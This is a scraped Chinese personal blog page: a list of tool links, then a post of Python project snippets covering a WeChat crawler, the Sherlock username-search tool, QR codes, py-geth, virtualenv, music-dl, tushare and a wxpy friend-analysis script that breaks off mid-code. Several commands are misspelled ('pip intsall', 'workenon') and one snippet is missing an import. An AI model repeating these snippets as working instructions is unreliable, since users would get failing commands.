<p><a href="https://crifan.github.io/scientific_network_summary/website/server_client_mode/ss_client/client_windows.html" target="_blank" rel="noopener">Windows中的Shadowsocks客户端https://jsproxy-test.tk/</a></p>
<p><a href="https://www.seekclipart.com/" target="_blank" rel="noopener">图片搜索</a></p>
<p><a href="https://www.pinpng.com/" target="_blank" rel="noopener">免费透明体背景的图片下载库pinpng</a></p>
<p><a href="https://oneinstack.com/" target="_blank" rel="noopener">部署PHP环境</a></p>
<p><a href="https://github.com/zencodex/composer-mirror" target="_blank" rel="noopener">Composer 中国全量镜像</a></p>
<p><a href="https://learnku.com/articles/30316" target="_blank" rel="noopener">UML 类图processon.com</a></p>
<p><a href="https://xclient.info/" target="_blank" rel="noopener">mac软件</a></p>
<p><a href="https://zhimap.com" target="_blank" rel="noopener">在线导图mubu.com</a></p>
<p><a href="http://www.hiwenku.com/" target="_blank" rel="noopener">下载百度文库</a></p>
<p><a href="http://tools.bugscaner.com/google/" target="_blank" rel="noopener">google镜像 206.189.135.241/ google.upupming.site</a></p>
<p><a href="https://github.com/Alvin9999/new-pac/wiki/%E8%B0%B7%E6%AD%8C%E9%95%9C%E5%83%8F" target="_blank" rel="noopener">谷歌google镜像</a></p>
<p><a href="https://michael728.github.io/2015/11/26/tools-chrome-extentions/" target="_blank" rel="noopener">那些离不开的 Chrome 扩展插件</a></p>
<p><a href="http://tool.liumingye.cn/" target="_blank" rel="noopener">工具箱</a></p>
<p><a href="https://www.einsition.com/tools/emoji-cheat-sheet" target="_blank" rel="noopener"> Emoji cheat sheet 速查表</a></p>
<p><a href="http://www.oicqzone.com/tool/eval/" target="_blank" rel="noopener">解析经过 eval 加密的 JS</a></p>
<p><a href="https://g.zmirrordemo.com" target="_blank" rel="noopener">google镜像google.0xgg.com  </a></p>
<p><a href="https://chmod-calculator.com/" target="_blank" rel="noopener">解析八进制权限数字 </a></p>
<p><a href="https://view.officeapps.live.com/op/view.aspx?src=http%3A%2F%2Fvideo.ch9.ms%2Fbuild%2F2011%2Fslides%2FTOOL-532T_Sutter.pptx" target="_blank" rel="noopener">office 在线预览服务</a></p>
<p><a href="https://alpha2016.github.io/2019/07/14/office-%E6%96%87%E6%A1%A3%E5%9C%A8%E7%BA%BF%E9%A2%84%E8%A7%88%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/" target="_blank" rel="noopener">Office 文档在线预览的几种方案</a></p>
<p><a href="https://mirrors.huaweicloud.com/elasticsearch/" target="_blank" rel="noopener">Elasticsearch 国内镜像https://thans.cn/mirror/elasticsearch.html</a></p>
<p><a href="http://www.welefen.com/lab/mbti/" target="_blank" rel="noopener">MBTI职业性格测试最新版</a></p>
<p><a href="http://biggsai.com/maze.html" target="_blank" rel="noopener">有意思的迷宫游戏。 </a></p>
<p>翻译 <a href="https://tingtalk.me/spoken-english/" target="_blank" rel="noopener">https://tingtalk.me/spoken-english/</a></p>
<p>在线旋转视频 <a href="https://tingtalk.me/digital-life-tips/" target="_blank" rel="noopener">https://tingtalk.me/digital-life-tips/</a> <a href="https://www.aconvert.com/cn/video/rotate/" target="_blank" rel="noopener">https://www.aconvert.com/cn/video/rotate/</a></p>
<p>打开即用的免费在线白板工具 <a href="https://witeboard.com/db103a80-e330-11e9-ba19-2db460254e5d" target="_blank" rel="noopener">https://witeboard.com/db103a80-e330-11e9-ba19-2db460254e5d</a></p>
<p>简单搜索 App：无广告的 Baidu <a href="http://www.searchcraft.cn/" target="_blank" rel="noopener">http://www.searchcraft.cn/</a></p>
<p>Chrome 插件 <a href="https://tingtalk.me/chrome/" target="_blank" rel="noopener">https://tingtalk.me/chrome/</a></p>
<p>翻墙指南 <a href="https://tingtalk.me/fq/" target="_blank" rel="noopener">https://tingtalk.me/fq/</a> <a href="https://tingtalk.me/fq-diy/" target="_blank" rel="noopener">https://tingtalk.me/fq-diy/</a></p>
<p>简历工具 <a href="https://resume.mdnice.com/" target="_blank" rel="noopener">https://resume.mdnice.com/</a> <a href="https://tingtalk.me/resume-tips/" target="_blank" rel="noopener">https://tingtalk.me/resume-tips/</a></p>
<p>中文排版指南 <a href="https://tingtalk.me/typography/" target="_blank" rel="noopener">https://tingtalk.me/typography/</a></p>
<p>Google 搜索技巧 <a href="https://tingtalk.me/google-search-tips/" target="_blank" rel="noopener">https://tingtalk.me/google-search-tips/</a></p>
<p>保险入门指南 <a href="https://tingtalk.me/personal-insurance/" target="_blank" rel="noopener">https://tingtalk.me/personal-insurance/</a></p>
<p>驾考指南 <a href="https://tingtalk.me/driving-test/" target="_blank" rel="noopener">https://tingtalk.me/driving-test/</a></p>
<p>Windows 电脑：使用技巧<a href="https://tingtalk.me/windows/" target="_blank" rel="noopener">https://tingtalk.me/windows/</a></p>
<p>向日葵远程控制 <a href="https://sunlogin.oray.com/personal/" target="_blank" rel="noopener">https://sunlogin.oray.com/personal/</a></p>
<p>写作技巧<a href="https://tingtalk.me/composition-seven-tips/" target="_blank" rel="noopener">https://tingtalk.me/composition-seven-tips/</a></p>
<p>1024课堂 <a href="https://1024casts.com/topics" target="_blank" rel="noopener">https://1024casts.com/topics</a></p>
<p>自动采集文章兼发布文章 - 优化推广工具<a href="https://www.lmcjl.com/index/collectarticles/index.html?menu_id=65" target="_blank" rel="noopener">https://www.lmcjl.com/index/collectarticles/index.html?menu_id=65</a></p>
<p>api 测试工具 RunApi，欢迎使用：<a href="http://runapi.showdoc.cc" target="_blank" rel="noopener">http://runapi.showdoc.cc</a></p>
<p>网盘搜索集合网站  <a href="http://www.chaonengsou.com/" target="_blank" rel="noopener">http://www.chaonengsou.com/</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/12/有用的Python项目收集/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/12/有用的Python项目收集/" itemprop="url">有用的Python项目收集</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-12T14:09:33+08:00">
                2018-12-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  10.5k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  50 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="高效微信公众号历史文章和阅读数据爬虫"><a href="#高效微信公众号历史文章和阅读数据爬虫" class="headerlink" title="高效微信公众号历史文章和阅读数据爬虫"></a>高效微信公众号历史文章和阅读数据爬虫</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#git clone https://github.com/wonderfulsuccess/weixin_crawler</span><br><span class="line">$ cd weixin_crawler/project/</span><br><span class="line">#https://github.com/24OI/OI-wiki/</span><br><span class="line">$ python(<span class="number">3</span>) ./main.py</span><br></pre></td></tr></table></figure>
<h3 id="编程竞赛"><a href="#编程竞赛" class="headerlink" title="编程竞赛"></a>编程竞赛</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//git.dev.tencent.com/scaffrey/OI-wiki.git -b coding-pages</span></span><br><span class="line"># 如果是 python3</span><br><span class="line">python3 -m http.server</span><br><span class="line"># 如果是 python2</span><br><span class="line">python2 -m SimpleHTTPServer <span class="number">8888</span></span><br><span class="line"># 有些环境下找不到名叫 python3/python2 的可执行文件，不妨运行 python 试试</span><br></pre></td></tr></table></figure>
<h3 id="全网帮你抓取信息"><a href="#全网帮你抓取信息" class="headerlink" title="全网帮你抓取信息"></a>全网帮你抓取信息</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># clone the repo</span><br><span class="line">$ git clone https:<span class="comment">//github.com/TheYahya/sherlock.git</span></span><br><span class="line"></span><br><span class="line"># change the working directory to sherlock</span><br><span class="line">$ cd sherlock</span><br><span class="line"></span><br><span class="line"># install the requirements</span><br><span class="line">$ pip3 install -r requirements.txt</span><br><span class="line">$ python3 sherlock.py --help</span><br><span class="line">usage: sherlock.py [-h] [--version] [--verbose] [--quiet] [--tor]</span><br><span class="line">                   [--unique-tor] [--csv] [--site SITE_NAME]</span><br><span class="line">                   USERNAMES [USERNAMES ...]</span><br><span class="line"></span><br><span class="line">Sherlock: Find Usernames Across Social Networks (Version <span class="number">0.2</span><span class="number">.0</span>)</span><br></pre></td></tr></table></figure>
<h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pip install qrcode</span><br><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line"></span><br><span class="line"># 二维码内容</span><br><span class="line">data = <span class="string">"https://www.baidu.com"</span></span><br><span class="line"># 生成二维码</span><br><span class="line">img = qrcode.make(data=data)</span><br><span class="line"># 直接显示二维码</span><br><span class="line">img.show()</span><br><span class="line"># 保存二维码为文件</span><br><span class="line"># img.save("baidu.jpg")</span><br><span class="line">pip install zxing</span><br><span class="line"><span class="keyword">import</span> zxing</span><br><span class="line"></span><br><span class="line">reader = zxing.BarCodeReader()</span><br><span class="line">barcode = reader.decode(<span class="string">"baidu.jpg"</span>)</span><br><span class="line">print(barcode.parsed)</span><br></pre></td></tr></table></figure>
<h3 id="本地区块链"><a href="#本地区块链" class="headerlink" title="本地区块链"></a>本地区块链</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://learnku.com/articles/23196</span></span><br><span class="line">pip install py-geth</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">from</span> geth <span class="keyword">import</span> LiveGethProcess</span><br><span class="line">&gt;&gt;&gt; geth = LiveGethProcess()</span><br><span class="line">&gt;&gt;&gt; geth.start()</span><br><span class="line">&gt;&gt;&gt; geth = DevGethProcess(<span class="string">'testing'</span>, <span class="string">'/tmp/some-other-base-dir/'</span>)</span><br><span class="line">&gt;&gt;&gt; geth.start()</span><br></pre></td></tr></table></figure>
<h3 id="虚拟环境安装"><a href="#虚拟环境安装" class="headerlink" title="虚拟环境安装"></a>虚拟环境安装</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pip intsall virtualenv </span><br><span class="line">pip install virtualenvwrapper-win  <span class="comment">//windows下</span></span><br><span class="line">pip install virtualenvwrapper  <span class="comment">//linux</span></span><br><span class="line">mkvirtualenv *envName*  <span class="comment">//创建一个虚拟环境 创建在用户家目录下</span></span><br><span class="line">workenon *envName*  <span class="comment">//激活环境</span></span><br><span class="line">rmvirtualenv *envName* <span class="comment">//删除环境</span></span><br><span class="line">deactivate  <span class="comment">//退出环境</span></span><br><span class="line">worken <span class="comment">//列出环境</span></span><br><span class="line">需要进入虚拟环境中，执行pip install即可</span><br></pre></td></tr></table></figure>
<h3 id="网易云音乐下载"><a href="#网易云音乐下载" class="headerlink" title="网易云音乐下载"></a>网易云音乐下载</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">$ pip3 install pymusic-dl</span><br><span class="line"></span><br><span class="line">$ music-dl --help</span><br><span class="line">Usage: music-dl [OPTIONS]</span><br><span class="line"></span><br><span class="line">  Search and download music <span class="keyword">from</span> netease, qq, kugou, baidu and xiami.</span><br><span class="line">  Example: music-dl -k <span class="string">"周杰伦"</span></span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version            Show the version and exit.</span><br><span class="line">  -k, --keyword TEXT   搜索关键字</span><br><span class="line">  -s, --source TEXT    数据源目前支持qq netease kugou baidu xiami flac</span><br><span class="line">  -c, --count INTEGER  搜索数量限制</span><br><span class="line">  -o, --outdir TEXT    指定输出目录</span><br><span class="line">  -x, --proxy TEXT     指定代理（如http:<span class="comment">//127.0.0.1:1087）</span></span><br><span class="line">  -m, --merge          对搜索结果去重和排序（默认不去重）</span><br><span class="line">  -v, --verbose        详细模式</span><br><span class="line">  --help               Show <span class="keyword">this</span> message and exit.</span><br><span class="line">  </span><br><span class="line">  λ music-dl -k <span class="string">'周杰伦'</span></span><br><span class="line">  </span><br><span class="line">  Searching <span class="string">'周杰伦'</span> <span class="keyword">from</span> ... QQ ... KUGOU ... NETEASE ... BAIDU ... XIAMI ...</span><br><span class="line">  ---------------------------</span><br><span class="line">  </span><br><span class="line">   [  <span class="number">0</span> ]      QQ | <span class="number">0</span>:<span class="number">03</span>:<span class="number">35</span> -  <span class="number">3.28</span>MB - 周杰伦 - 告白气球 - 周杰伦的床边故事</span><br><span class="line">   [  <span class="number">1</span> ]      QQ | <span class="number">0</span>:<span class="number">03</span>:<span class="number">59</span> -  <span class="number">3.66</span>MB - 周杰伦 - 青花瓷 - 我很忙</span><br><span class="line">   [  <span class="number">2</span> ]      QQ | <span class="number">0</span>:<span class="number">04</span>:<span class="number">29</span> -  <span class="number">4.12</span>MB - 周杰伦 - 晴天 - 叶惠美</span><br><span class="line">   [  <span class="number">3</span> ]      QQ | <span class="number">0</span>:<span class="number">05</span>:<span class="number">26</span> -  <span class="number">4.99</span>MB - 周杰伦 - 轨迹 (伴奏) - 寻找周杰伦</span><br><span class="line">   [  <span class="number">4</span> ]      QQ | <span class="number">0</span>:<span class="number">04</span>:<span class="number">16</span> -  <span class="number">3.92</span>MB - 周杰伦 - 说好的幸福呢 - 魔杰座</span><br><span class="line">   [  <span class="number">5</span> ]   KUGOU | <span class="number">0</span>:<span class="number">03</span>:<span class="number">35</span> -  <span class="number">3.28</span>MB - 周杰伦 - 告白气球 - 周杰伦的床边故事</span><br><span class="line">   [  <span class="number">6</span> ]   KUGOU | <span class="number">0</span>:<span class="number">04</span>:<span class="number">29</span> -  <span class="number">4.12</span>MB - 周杰伦 - 晴天 - 叶惠美</span><br><span class="line">   [  <span class="number">7</span> ]   KUGOU | <span class="number">0</span>:<span class="number">03</span>:<span class="number">57</span> -  <span class="number">3.62</span>MB - 周杰伦 - 青花瓷 - 我很忙</span><br><span class="line">   [  <span class="number">8</span> ]   KUGOU | <span class="number">0</span>:<span class="number">03</span>:<span class="number">43</span> -  <span class="number">3.41</span>MB - 周杰伦 - 稻香 - 魔杰座</span><br><span class="line">   [  <span class="number">9</span> ]   KUGOU | <span class="number">0</span>:<span class="number">04</span>:<span class="number">56</span> -  <span class="number">4.53</span>MB - 周杰伦 - 不能说的秘密 - 不能说的秘密 电影原声带</span><br><span class="line">   [ <span class="number">10</span> ] NETEASE | <span class="number">0</span>:<span class="number">03</span>:<span class="number">12</span> -  <span class="number">2.21</span>MB - 周杰伦、李玟 - 刀马旦 - Partners 拍档</span><br><span class="line">   [ <span class="number">11</span> ]   BAIDU | <span class="number">0</span>:<span class="number">04</span>:<span class="number">28</span> - <span class="number">22.38</span>MB - 山弟 - 周杰伦 - 周杰伦</span><br><span class="line">   [ <span class="number">12</span> ]   BAIDU | <span class="number">0</span>:<span class="number">03</span>:<span class="number">35</span> -  <span class="number">3.29</span>MB - 周杰伦 - 告白气球 - 周杰伦的床边故事</span><br><span class="line">   [ <span class="number">13</span> ]   BAIDU | <span class="number">0</span>:<span class="number">03</span>:<span class="number">59</span> -  <span class="number">3.65</span>MB - 周杰伦 - 青花瓷 - 我很忙</span><br><span class="line">   [ <span class="number">14</span> ]   BAIDU | <span class="number">0</span>:<span class="number">04</span>:<span class="number">30</span> -  <span class="number">4.14</span>MB - 周杰伦 - 简单爱 - 婚礼歌手 幸福情歌精选</span><br><span class="line">   [ <span class="number">15</span> ]   BAIDU | <span class="number">0</span>:<span class="number">03</span>:<span class="number">46</span> -  <span class="number">3.46</span>MB - 周杰伦 - 夜曲 - 十一月的萧邦</span><br><span class="line">   [ <span class="number">16</span> ]   XIAMI | <span class="number">0</span>:<span class="number">03</span>:<span class="number">40</span> -  <span class="number">3.61</span>MB - 张学友 - 星晴 (Live) - 活出生命Live演唱会</span><br><span class="line">   [ <span class="number">17</span> ]   XIAMI | <span class="number">0</span>:<span class="number">03</span>:<span class="number">15</span> -  <span class="number">2.98</span>MB - Abby - 周杰伦香水广告BGM - 周杰伦香水广告</span><br><span class="line">   [ <span class="number">18</span> ]   XIAMI | <span class="number">0</span>:<span class="number">04</span>:<span class="number">08</span> -   <span class="number">9.5</span>MB - G.E.M.邓紫棋 - 龙卷风 - 龙卷风</span><br><span class="line">   [ <span class="number">19</span> ]   XIAMI | <span class="number">0</span>:<span class="number">04</span>:<span class="number">34</span> -  <span class="number">4.19</span>MB - 鲁瑾 - 周杰伦：夜曲 - 二十年的青春和往昔第五季 这一刻你依然如此动人</span><br><span class="line">   [ <span class="number">20</span> ]   XIAMI | <span class="number">0</span>:<span class="number">03</span>:<span class="number">16</span> -  <span class="number">2.99</span>MB - Abby - 周杰伦香水广告单曲（升key） - 周杰伦香水广告</span><br><span class="line">  </span><br><span class="line">  ---------------------------</span><br><span class="line">  请输入下载序号，支持形如 <span class="number">0</span> <span class="number">3</span><span class="number">-5</span> <span class="number">8</span> 的格式，输入 N 跳过下载</span><br></pre></td></tr></table></figure>
<h3 id="股票行情"><a href="#股票行情" class="headerlink" title="股票行情"></a>股票行情</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pip instasll tushare</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tushare <span class="keyword">as</span> ts</span><br><span class="line">ts.set_token(<span class="string">'你的token'</span>)</span><br><span class="line">pro = ts.pro_api()</span><br><span class="line">data = pro.stock_basic(exchange_id=<span class="string">''</span>, is_hs=<span class="string">''</span>, fields=<span class="string">'symbol,name,is_hs,list_date,list_status'</span>)</span><br><span class="line">print(data)</span><br><span class="line"># ''表示获取全部https://www.makcyun.top/python_data_analysis01.html </span><br><span class="line">data = data.set_index(data[<span class="string">'list_date'</span>])</span><br><span class="line">data = data[<span class="string">'2017'</span>]</span><br><span class="line">print(data.head())</span><br><span class="line"># 结果</span><br><span class="line">              ts_code  symbol  name list_status  list_date is_hs</span><br><span class="line">list_date                                                       </span><br><span class="line"><span class="number">2017</span><span class="number">-12</span><span class="number">-25</span>  <span class="number">001965.</span>SZ  <span class="number">001965</span>  招商公路           L <span class="number">2017</span><span class="number">-12</span><span class="number">-25</span>     S</span><br><span class="line"><span class="number">2017</span><span class="number">-03</span><span class="number">-24</span>  <span class="number">002774.</span>SZ  <span class="number">002774</span>  快意电梯           L <span class="number">2017</span><span class="number">-03</span><span class="number">-24</span>     N</span><br><span class="line"><span class="number">2017</span><span class="number">-01</span><span class="number">-12</span>  <span class="number">002824.</span>SZ  <span class="number">002824</span>  和胜股份           L <span class="number">2017</span><span class="number">-01</span><span class="number">-12</span>     N</span><br><span class="line"><span class="number">2017</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">002838.</span>SZ  <span class="number">002838</span>  道恩股份           L <span class="number">2017</span><span class="number">-01</span><span class="number">-06</span>     N</span><br><span class="line"><span class="number">2017</span><span class="number">-01</span><span class="number">-24</span>  <span class="number">002839.</span>SZ  <span class="number">002839</span>  张家港行           L <span class="number">2017</span><span class="number">-01</span><span class="number">-24</span>     S</span><br></pre></td></tr></table></figure>
<h3 id="使用python生成微信好友地域分析"><a href="#使用python生成微信好友地域分析" class="headerlink" title="使用python生成微信好友地域分析"></a>使用python生成微信好友地域分析</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"><span class="keyword">from</span> wxpy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> wxpy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">import</span> re, jieba</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud,ImageColorGenerator</span><br><span class="line"><span class="keyword">import</span> matplotlib.font_manager <span class="keyword">as</span> fm</span><br><span class="line"># 初始化一个机器人对象https://zhuanlan.zhihu.com/p/60723803</span><br><span class="line"># cache_path缓存路径，给定值为第一次登录生成的缓存文件路径</span><br><span class="line">bot = Bot()</span><br><span class="line">#获取好友列表(包括自己)</span><br><span class="line">my_friends = bot.friends(update=False)</span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">stats_text 函数：帮助我们简单统计微信好友基本信息</span></span><br><span class="line"><span class="string">简单的统计结果的文本</span></span><br><span class="line"><span class="string">    :param total: 总体数量</span></span><br><span class="line"><span class="string">    :param sex: 性别分布</span></span><br><span class="line"><span class="string">    :param top_provinces: 省份分布</span></span><br><span class="line"><span class="string">    :param top_cities: 城市分布</span></span><br><span class="line"><span class="string">    :return: 统计结果文本</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line">print(my_friends.stats_text())</span><br><span class="line"># 清洗数据，生成词云图</span><br><span class="line">#获取当前的项目文件加的路径</span><br><span class="line">#读取停用词表</span><br><span class="line">stopwords_path=<span class="string">'static/stopwords.txt'</span></span><br><span class="line"></span><br><span class="line">#定义个函数式用于分词</span><br><span class="line">def jiebaclearText(text):</span><br><span class="line">    #定义一个空的列表，将去除的停用词的分词保存</span><br><span class="line">    mywordList=[]</span><br><span class="line">    #进行分词</span><br><span class="line">    seg_list=jieba.cut(text,cut_all=False)</span><br><span class="line">    #将一个generator的内容用/连接</span><br><span class="line">    listStr=<span class="string">'/'</span>.join(seg_list)</span><br><span class="line">    listStr = listStr.replace(<span class="string">"class"</span>,<span class="string">""</span>)</span><br><span class="line">    listStr = listStr.replace(<span class="string">"span"</span>, <span class="string">""</span>)</span><br><span class="line">    listStr = listStr.replace(<span class="string">"emoji"</span>, <span class="string">""</span>)</span><br><span class="line">    #打开停用词表</span><br><span class="line">    f_stop=open(stopwords_path,encoding=<span class="string">"utf8"</span>)</span><br><span class="line">    #读取</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f_stop_text=f_stop.read()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        f_stop.close()#关闭资源</span><br><span class="line">    #将停用词格式化，用\n分开，返回一个列表</span><br><span class="line">    f_stop_seg_list=f_stop_text.split(<span class="string">"\n"</span>)</span><br><span class="line">    #对默认模式分词的进行遍历，去除停用词</span><br><span class="line">    <span class="keyword">for</span> myword <span class="keyword">in</span> listStr.split(<span class="string">'/'</span>):</span><br><span class="line">        #去除停用词</span><br><span class="line">        <span class="keyword">if</span> not(myword.split()) <span class="keyword">in</span> f_stop_seg_list and len(myword.strip())&gt;<span class="number">1</span>:</span><br><span class="line">            mywordList.append(myword)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">' '</span>.join(mywordList)</span><br><span class="line"># 生成词云图</span><br><span class="line">def make_wordcloud(text1,i):</span><br><span class="line">	bg = plt.imread(r<span class="string">"image/heart.jpg"</span>)</span><br><span class="line">	# 生成</span><br><span class="line">	wc = WordCloud(# FFFAE3</span><br><span class="line">		background_color="#FFFFFF",  # 设置背景为白色，默认为黑色</span><br><span class="line">		width=990,  # 设置图片的宽度</span><br><span class="line">		height=440,  # 设置图片的高度</span><br><span class="line">		mask=bg,</span><br><span class="line">		margin=10,  # 设置图片的边缘</span><br><span class="line">		max_font_size=70,  # 显示的最大的字体大小</span><br><span class="line">		random_state=20,  # 为每个单词返回一个PIL颜色</span><br><span class="line">		font_path='static/simkai.ttf'  # 中文处理，用系统自带的字体</span><br><span class="line">	).generate(text1)</span><br><span class="line">	# 为图片设置字体</span><br><span class="line">	my_font = fm.FontProperties(fname=<span class="string">'static/simkai.ttf'</span>)</span><br><span class="line">	# 图片背景</span><br><span class="line">	bg_color = ImageColorGenerator(bg)</span><br><span class="line">	